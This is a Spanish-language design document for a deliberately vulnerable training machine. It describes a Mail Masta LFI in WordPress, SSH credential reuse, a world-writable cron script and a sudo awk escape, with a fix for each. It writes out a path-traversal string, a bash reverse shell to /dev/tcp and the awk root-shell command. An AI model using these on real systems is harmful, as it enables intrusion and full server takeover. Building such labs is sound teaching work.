# Desarrollo

## 1. Descripción general del sistema (Máquina: Ammonia)

#### Tipo de sistema: Servidor interno basado en el sistema operativo Ubuntu Server (Version 22.04)
#### Finalidad: Alojar la aplicación web corporativa / blog de divulgación científica.
#### Servicios principales instalados:
- Servidor web lighttpd ((MD-2)) en el puerto 7664 corriendo una instancia de WordPress ((WB-1)).
- Servidor de acceso remoto OpenSSH ((MD-1)) en el puerto estándar 22.

#### Usuarios relevantes:
- haber_fritz: Cuenta local con bajos privilegios encargada de la gestión del entorno inicial.
- clara_immerwahr: Cuenta local intermedia responsable de las tareas de automatización y almacenamiento de documentos científicos.
- root: Superusuario y administrador absoluto del sistema.

#### Vulnerabilidades creadas (Cadena de explotación):

- Inclusión de Archivos Locales (LFI): Presencia del plugin vulnerable Mail Masta en la aplicación web, lo que permite la lectura de archivos sensibles como wp-config.php y la fuga de credenciales de la base de datos.

- Reutilización de Credenciales: La clave hallada en la configuración web es válida para el acceso SSH del usuario haber_fritz.

- Permisos de Escritura Globales (777) en Tarea Cron: El script /opt/scripts/backup_notes.sh ((SC-1)) es ejecutado automáticamente por el usuario clara_immerwahr en intervalos de un minuto, pero permite su modificación por cualquier usuario del sistema.

- Configuración Laxa de Sudoers: El usuario clara_immerwahr dispone de permisos de ejecución para el binario /usr/bin/awk bajo privilegios de root sin requerir contraseña (NOPASSWD).

#### Objetivo de la auditoría: 
El auditor deberá identificar la vulnerabilidad LFI para extraer las credenciales, consolidar acceso inicial por SSH como haber_fritz, secuestrar la tarea programada modificando el script de mantenimiento para pivotar al usuario clara_immerwahr y, finalmente, abusar de la directiva de sudo mediante la técnica de escape del binario awk (GTFOBins) para comprometer totalmente el sistema obteniendo una shell como root.

## 2. Esquema de activos y recorrido de explotación

### 2.1. Esquema de activos
```bash
                                               ┌────────┐
                                               │  WEB   │
                                       ((WB-1))│  Blog  │ (WordPress)
                                               └───┬────┘ 
                                                   │ 
                                               ┌───▼────┐
                                               │lighttpd│ ((MD-2)) 
                                ┌─────────┐    └───┬────┘ 
                        ((MD-1))│ OpenSSH │        │ pt. 7664
                                └────┬────┘        │
                                     │ pt. 22      │ 
                                ┌────▼────┐    ┌───▼─────┐               
                      ((COM-1)) │   SSH   │    │  HTTP   │ ((COM-2))          
                                └─────────┘    └─────────┘      
                                     │              │      
                                     └──────┬───────┘
                                            │
                                    ┌───────▼───────┐
                     ((AC-1)) ──────│ Ubuntu Server │ ((SO-1)) 
                                    └───────────────┘
```
| **Identificador** | **Activo** | **Tipo** | **Función** | **Riesgo o Vulnerabilidad** |
|-------------------|------------|----------|-------------|------------------------------|
| **(WB-1)** | Blog (WordPress) | Aplicación / Web | Publicar el contenido web y actuar como interfaz principal del reto. | Información sensible expuesta (Inclusión de archivos locales o LFI mediante plugins vulnerables que comprometen el código). |
| **(MD-2)** | lighttpd | Middleware | Procesar las peticiones HTTP destinadas al blog en el puerto 7664. | Exposición de cabeceras o logs que agraven la fuga de datos si el servicio lee configuraciones de forma insegura. |
| **(MD-1)** | OpenSSH | Middleware | Gestionar las conexiones de consola remota segura en el puerto 22. | Abuso de canales de administración mediante credenciales obtenidas de forma ilícita (reutilización de claves). |
| **(COM-1)** | SSH | Comunicación | Canal de transporte para sesiones interactivas y comandos remotos. | Establecimiento de conexiones no autorizadas (shells reversas o directas) si el tráfico saliente/entrante no está filtrado. |
| **(COM-2)** | HTTP | Comunicación | Canal de transporte de hipertexto para la navegación web del usuario. | Intercepción o manipulación de peticiones si el canal viaja sin cifrar y se realizan ataques en la red local. |
| **(SO-1)** | Ubuntu Server | Servidor / S.O. | Alojar el núcleo del sistema, gestionar procesos y orquestar el hardware virtual. | Escalada de privilegios a nivel de kernel o explotación de malas configuraciones en la directiva global de sudoers. |
| **(AC-1)** | Usuarios y Archivos | Control de Acceso / Datos | Regular las identidades locales (haber_fritz, clara) y proteger los scripts/backups de mantenimiento. | Permisos laxos e incorrectos en el sistema de archivos (777 en scripts de Cron), permitiendo la inyección de código a usuarios no autorizados. |

### 2.2. Recorrido de explotación

```bash
[ Atacante (Kali) ]
       │
       ▼ (LFI en WordPress)
[ user: haber_fritz ]  <-- (Sabe de química y procesos industriales)
       │
       ▼ (Movimiento Lateral: Tarea Cron / Script inseguro)
[ user: clara_immerwahr ] <-- (Su esposa, química brillante y pacifista opositora)
       │
       ▼ (Escalada de Privilegios: GTFOBins vía sudo o SUID)
[ ROOT ]
```

## 3. Administración de procesos y rendimiento

## 4. Administración del almacenamiento

## 5. Administración de usuarios, permisos y accesos

## 6. Evaluación de servicios de comunicaciones

## 7. Vulnerabilidades implementadas

### 7.1. Vulnerabilidad de Acceso Inicial: Plugin Vulnerable (Mail Masta - LFI)

- Activo afectado: ((WB-1)) Blog (WordPress) / ((MD-2)) lighttpd (Puerto 7664).

- Configuración la provoca: La instalación y activación del plugin desactualizado Mail Masta (versión 1.0), el cual carece de sanitización en sus parámetros de entrada (específicamente en variables de inclusión de archivos).

- Riesgo representa: Permite a un atacante no autenticado evadir los controles de acceso a archivos del servidor web y leer archivos arbitrarios internos del sistema operativo (Local File Inclusion).

- Cómo puede explotarse: Mediante el envío de una petición HTTP manipulada que utilice secuencias de salto de directorio (../../../../etc/passwd) a través del parámetro vulnerable del plugin para forzar al servidor a renderizar el contenido de archivos locales del sistema de archivos, tales como /etc/passwd o wp-config.php.

- Impacto: Crítico. Fuga de información confidencial y exposición de las credenciales de texto plano de la base de datos de WordPress, las cuales se reutilizan en el servicio SSH.

- Cómo se corregiría en un sistema real: Desinstalar de inmediato el plugin Mail Masta o actualizarlo a una versión parcheada que sanitice las entradas del usuario. Implementar directivas estrictas en la configuración de PHP (allow_url_fopen = Off y allow_url_include = Off).

### 7.2. Escalada de Privilegios (Movimiento Lateral): Tarea Cron Modificable

- Activo afectado: ((AC-1)) Usuarios y Archivos / Script de mantenimiento /opt/scripts/backup_notes.sh.

- Configuración la provoca: Una asignación laxa e incorrecta de privilegios en el sistema de archivos (chmod 777) sobre el script de copia de seguridad, sumado a una tarea programada en el archivo general /etc/crontab que ejecuta dicho script cada minuto bajo el contexto del usuario clara_immerwahr.

- Riesgo representa: Permite la inyección y ejecución de código arbitrario. Cualquier usuario con acceso local de bajos privilegios puede modificar el comportamiento del script.

- Cómo puede explotarse: El usuario inicial haber_fritz concatena una línea de comandos al final del archivo aprovechando su permiso de escritura (echo "bash -i >& /dev/tcp/IP/PUERTO 0>&1" >> /opt/scripts/backup_notes.sh). Al cumplirse el minuto, el demonio Cron procesa el archivo e inicia una conexión inversa automatizada.

- Impacto: Alto. Suplantación y toma de control horizontal de la identidad de la usuaria intermedia clara_immerwahr, obteniendo acceso directo a sus documentos e historial.

- Cómo se corregiría en un sistema real: Aplicar el principio de mínimo privilegio sobre el archivo de mantenimiento, eliminando el permiso de escritura para el resto de usuarios del sistema mediante el comando chmod 755 /opt/scripts/backup_notes.sh o asignando la propiedad estricta a su ejecutor legítimo.

### 7.3. Escalada de Privilegios (Máxima): Configuración Insegura de Sudo (awk)

- Activo afectado: ((SO-1)) Ubuntu Server / Reglas de Sudoers.

- Configuración la provoca: La inclusión de una regla permisiva en el archivo de configuración /etc/sudoers que autoriza explícitamente a la cuenta clara_immerwahr a ejecutar el binario del sistema /usr/bin/awk con privilegios de administrador sin requerir autenticación (NOPASSWD:).

- Riesgo representa: Evasión total de los controles de restricción de privilegios. El binario permitido cuenta con funciones nativas que permiten invocar intérpretes de comandos secundarios (shells).

- Cómo puede explotarse: Una vez que el auditor se encuentra en la sesión de Clara, invoca el binario abusando de la propiedad de ejecución de comandos interactivos (GTFOBins) mediante la sentencia: sudo awk 'BEGIN {system("/bin/sh")}'.

- Impacto: Crítico. Compromiso total y absoluto del servidor virtual. El auditor obtiene acceso directo como el superusuario root, logrando persistencia, lectura y modificación de cualquier recurso del sistema operativo.

- Cómo se corregiría en un sistema real: Revocar la directiva NOPASSWD para comandos que dispongan de funciones de escape integradas. Si es estrictamente necesario delegar la tarea a awk, estructurar scripts específicos firmados o restringir sus argumentos mediante alias de comandos específicos en /etc/sudoers para evitar la inyección de la función system().

## 8. Write-up de resolución
- [Write-up de resolución](ruta-explotacion.md)
  
## 9. Credenciales white box
- [Credenciales white box](credenciales-white-box.md)



